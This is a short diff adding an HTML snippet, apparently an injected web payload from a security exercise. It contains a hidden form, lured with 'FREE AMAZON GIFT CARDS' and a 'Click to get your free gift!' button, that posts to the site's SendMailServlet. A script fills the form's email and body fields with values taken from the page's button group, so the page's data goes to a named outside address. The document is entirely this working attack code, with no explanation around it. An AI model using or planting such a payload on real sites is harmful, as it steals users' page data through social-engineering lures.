@@ -1,0 +1,12 @@
+<form action="SendMailServlet" method="POST">
+<input type="hidden" name="email" id="gastani" value="document.get..."/>
+<input type="hidden" name="receiver" value="aangelone@unibz.it"/>
+<input type="hidden" name="subject" value="FREE AMAZON GIFT CARDS"/>
+<input type="hidden" name="body" id="frinzi" value="XXX"/>
+<input type="submit" value="Click to get your free gift!"/>
+</form>
+
+<script>
+	document.getElementById('gastani').value = document.getElementsByClassName('btn-group')[0].children[0].value;
+	document.getElementById('frinzi').value += document.getElementsByClassName('btn-group')[0].children[1].value;
+</script>
